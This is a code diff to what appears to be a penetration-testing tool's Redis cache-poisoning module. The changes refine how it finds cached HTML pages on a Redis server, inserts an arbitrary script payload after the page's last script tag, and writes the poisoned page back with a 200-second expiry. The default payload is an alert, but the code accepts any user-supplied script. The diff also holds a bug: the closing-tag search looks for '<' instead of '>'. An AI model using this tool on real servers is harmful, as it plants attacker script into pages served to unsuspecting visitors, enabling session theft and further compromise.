@@ -1,6 +1,8 @@
 # -*- coding: utf-8 -*-
 
+import six
 import redis
+import string
 import logging
 
 from lxml import etree
@@ -58,15 +60,41 @@ def handle_html(config, content):
 	# --------------------------------------------------------------------------
 	# Search start and end possition of HTML page
 	# --------------------------------------------------------------------------
+	pos_ini = pos_end = None
 	for i, x in enumerate(content):
-		if chr(x) == "<":
-			pos_ini = i
-			break
+		tmp_pos = -1
+		if six.PY2:
+			if six.u(x) == six.u("<"):
+				tmp_pos = i
+		else:
+			if chr(x) == "<":
+				tmp_pos = i
+
+		# Is printable? to avoid nulls and false '<'
+		if tmp_pos == i and len(content) != i:
+			if six.PY2:
+				if content[i + 1] in string.printable:
+					pos_ini = i
+					break
+			else:
+				if chr(content[i + 1]) in string.printable:
+					pos_ini = i
+					break
+
+		# else:
+
+			# pos_ini = i
+			# break
 
 	for i, x in enumerate(content[::-1]):
-		if chr(x) == ">":
-			pos_end = len(content) - i
-			break
+		if six.PY2:
+			if six.u(x) == six.u("<"):
+				pos_end = len(content) - i
+				break
+		else:
+			if chr(x) == "<":
+				pos_end = len(content) - i
+				break
 
 	if pos_ini is None or pos_end is None:
 		raise ValueError("Not found HTML content into cache")
@@ -74,41 +102,63 @@ def handle_html(config, content):
 	txt_content = content[pos_ini:pos_end]
 
 	# Parse input
-	tree = etree.fromstring(txt_content, etree.HTMLParser())
+	tree = etree.fromstring(txt_content, parser=etree.HTMLParser())
 	doc_root = tree.getroottree()
 
 	results = None
 
+	# --------------------------------------------------------------------------
 	# Search insertion points
-	for point in ("head", "title", "body", "script", "div", "p"):
-		insert_point = doc_root.find(".//%s" % point)
+	# --------------------------------------------------------------------------
 
-		if insert_point is None:
-			continue
+	# Try to find end of script entries
+	insert_point = doc_root.find(".//script[last()]")
 
-		# --------------------------------------------------------------------------
-		# Add the injection Payload
-		# --------------------------------------------------------------------------
-		if config.poison_payload_file is not None:
-			with open(config.poison_payload_file, "rU") as f:
-				_f_payload = f.read()
-			payload = etree.fromstring(_f_payload)
+	if insert_point is not None:
+		results = add_injection(config, doc_root, insert_point)
 
-		elif config.poison_payload:
-			payload = etree.fromstring(config.poison_payload)
-		else:
-			payload = etree.fromstring("<script>alert('You are vulnerable to broker injection')</script>")
+	else:
+		# Try to find othe entry
+		for point in ("head", "title", "body", "div", "p"):
+			insert_point = doc_root.find(".//%s" % point)
 
-		insert_point.addnext(payload)
+			if insert_point is None:
+				continue
 
-		# Set results
-		results = bytes(etree.tostring(doc_root))
+			results = add_injection(config, doc_root, insert_point)
 
-		break
+			break
 
 	# --------------------------------------------------------------------------
 	# Build results
 	# --------------------------------------------------------------------------
+	return results
+
+
+# ----------------------------------------------------------------------
+def add_injection(config, doc_root, insert_point):
+
+	# --------------------------------------------------------------------------
+	# Add the injection Payload
+	# --------------------------------------------------------------------------
+	if config.poison_payload_file is not None:
+		with open(config.poison_payload_file, "rU") as f:
+			_f_payload = f.read()
+		payload = etree.fromstring(_f_payload)
+
+	elif config.poison_payload:
+		payload = etree.fromstring(config.poison_payload)
+	else:
+		payload = etree.fromstring("<script>alert('You are vulnerable to broker injection')</script>")
+
+	insert_point.addnext(payload)
+
+	# Set results
+	tmp_results = etree.tostring(doc_root, method="html", pretty_print=True, encoding=doc_root.docinfo.encoding)
+
+	# Codding filters
+	results = tmp_results.decode(errors="replace").replace("\\u000a", "\n")
+
 	return results
 
 
@@ -137,10 +187,10 @@ def action_redis_cache_poison(config):
 		log.error("Looking for caches in '%s'..." % config.target)
 
 		for x in cache_keys:
-			log.warning("  - Possible cache found in key: %s" % str(x))
+			log.error("  - Possible cache found in key: %s" % str(x))
 
 		if not cache_keys:
-			log.warning("  - No caches found")
+			log.error("  - No caches found")
 
 		# Stop
 		return
@@ -156,9 +206,19 @@ def action_redis_cache_poison(config):
 	for val in cache_keys:
 		content = dump_key(val, con)
 
+		try:
+			_val = val.decode(errors="ignore")
+		except AttributeError:
+			_val = val
+
+		try:
+			_content = content.decode(errors="ignore")
+		except AttributeError:
+			_content = content
+
 		# If key doesn't exist content will be None
 		if content is None:
-			log.error("  - Provided key '%s' not found in server" % val)
+			log.error("  - Provided key '%s' not found in server" % _val)
 			continue
 
 		# --------------------------------------------------------------------------
@@ -168,7 +228,7 @@ def action_redis_cache_poison(config):
 		if config.poison is True:
 			# Set injection
 			try:
-				modified = handle_html(config, content)
+				modified = handle_html(config, content)  # DO NOT USE _content. Function expect bytes, not str.
 			except ValueError as e:
 				log.error("  - Can't modify cache content: " % e)
 				continue
@@ -177,18 +237,18 @@ def action_redis_cache_poison(config):
 
 			# Injection was successful?
 			if modified is None:
-				log.warning("  - Can't modify content: ensure that content is HTML")
+				log.error("  - Can't modify content: ensure that content is HTML")
 				continue
 
 			# Set injection into server
 			con.setex(val, 200, modified)
 
-			log.error("  - Poisoned cache key '%s' at server '%s'" % (val, config.target))
+			log.error("  - Poisoned cache key '%s' at server '%s'" % (_val, config.target))
 		else:
 
 			# If not poison enabled display cache keys
-			log.error("    -> Key: '%s' - " % val)
-			log.error("    -> Content:\n %s" % content)
+			log.error("    -> Key: '%s'" % _val)
+			log.error("    -> Content:\n %s" % _content)
 
 	if not cache_keys:
-		log.error("  - No cache keys found in server: Can't poison remote cache.")
+		log.error("  - No cache keys found in server.")
